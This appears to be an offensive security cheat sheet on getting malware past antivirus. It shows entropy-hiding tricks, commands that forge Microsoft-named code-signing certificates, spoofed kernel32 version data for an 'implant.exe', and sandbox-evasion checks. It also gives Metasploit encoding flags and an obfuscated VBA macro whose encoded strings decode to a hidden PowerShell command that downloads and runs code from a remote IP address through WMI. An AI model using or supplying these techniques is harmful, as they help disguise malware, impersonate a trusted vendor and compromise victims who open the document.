# Executable with high entropy
High entropy == encrypted data == detection (kinda)

Solutions:
- putting encrypted data on the stack (.text section)
- concatenate data to a image in the .rsrc section
- concatenate entire executable with another benign executable
- convert encrypted data to hexstring/guid like string

# Missing binary signature
Self signed CA:
```shell
makecert -r -pe -n "CN = Microsoft Root Certificate Authority 2010,O = Microsoft Corporation,L = Redmond,S = Washington,C = US" -ss CA -sr CurrentUser -a sha256 -cy authority -sky signature -sv CA.pvk CA.cer
```

Self signed cert:
```shell
makecert -pe -n "CN=Microsoft Windows Production PCA 2011,O = Microsoft Corporation,L = Redmond,S = Washington,C = US" -a sha256 -cy end -sky signature -eku 1.3.6.1.5.5.7.3.3,1.3.6.1.4.1.311.10.3.24,1.3.6.1.4.1.311.10.3.6 -ic CA.cer -iv CA.pvk -sv SPC.pvk SPC.cer
```

Convert to PFX:
```shell
pvk2pfx -pvk SPC.pvk -spc SPC.cer -pfx SPC.pfx
```

Sign binary:
```shell
signtool sign /v /f SPC.pfx EXECUTABLE
```

# Missing executable details/description
ResHacker.exe > File > Open... > EXECUTABLE > Action > Add from a Resource file... > c:/windows/system32/kernel32.dll

or using batch file to compile it automatically:
```shell
@ECHO OFF

rc ver.rc
cvtres /MACHINE:x64 /OUT:ver.o ver.res
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcimplant.cpp /link /OUT:implant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64 ver.o

del *.obj *.o *.res
```

Using this resource file:
```
1 VERSIONINFO
FILEVERSION 10,0,17763,475
PRODUCTVERSION 10,0,17763,475
FILEOS 0x40004
FILETYPE 0x2
{
	BLOCK "StringFileInfo"
	{
		BLOCK "040904B0"
		{
			VALUE "CompanyName", "Microsoft Corporation"
			VALUE "FileDescription", "Windows NT BASE API Client DLL"
			VALUE "FileVersion", "10.0.17763.475 (WinBuild.160101.0800)"
			VALUE "InternalName", "kernel32"
			VALUE "LegalCopyright", "\xA9 Macrohard Corporation. All rights reserved."
			VALUE "OriginalFilename", "kernel32"
			VALUE "ProductName", "Microsoft\xAE Windows\xAE Operating System"
			VALUE "ProductVersion", "10.0.17763.475"
		}
	}
	
	BLOCK "VarFileInfo"
	{
		VALUE "Translation", 0x0409 0x04B0  
	}
}
```

# Sleep Shanenigans
```csharp
[DllImport("kernel32.dll")] static extern void Sleep(uint dwMilliseconds);

DateTime t1 = DateTime.Now;
Sleep(4000);
double delta = DateTime.Now.Subtract(t1).TotalSeconds;
if (delta < 3) return;
```

# Non-Emulated APIs
```csharp
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect, UInt32 nndPreferred);
[DllImport("kernel32.dll", SetLastError = true)] public static extern IntPtr GetCurrentProcess();

IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
if (mem == IntPtr.Zero) return;
```

# VBA Macro Evasion
```vb
Function Pears(Beets)
	Pears = Chr(Beets - 17)
End Function

Function Strawberries(Grapes)
	Strawberries = Left(Grapes, 3)
End Function

Function Almonds(Jelly)
	Almonds = Right(Jelly, Len(Jelly) - 3)
End Function

Function Nuts(Milk)
	Do
		Oatmilk = Oatmilk + Pears(Strawberries(Milk))
		Milk = Almonds(Milk)
	Loop While Len(Milk) > 0
	Nuts = Oatmilk
End Function

Function MyMacro()  
	Dim Apples As String
	Dim Water As String
	
	If ActiveDocument.Name <> Nuts("131134127127118131063117128116") Then
		Exit Function
	End If
	
	Apples = "129128136118131132121118125125049062118137118116049115138129114132132049062127128129049062136049121122117117118127049062116049122118137057057127118136062128115123118116133049132138132133118126063127118133063136118115116125122118127133058063117128136127125128114117132133131122127120057056121133133129075064064066074067063066071073063066066074063066067065064115128128124063133137133056058058"
	Water = Nuts(Apples)
	GetObject(Nuts("136122127126120126133132075")).Get(Nuts("104122127068067112097131128116118132132")).Create Water, Tea, Coffee, Napkin
End Function
```

# Metasploit Encoders
```bash
msfvenom --list encoders
-e x86/shikata_na_gai
-e x64/zutto_dekiru
```

# Mestaploit Custom Template Executable
```bash
-x notepad.exe
```

# Metasploit Encryption
```bash
msfvenom --list encryption
--encrypt aes --encrypt-key 8990
```
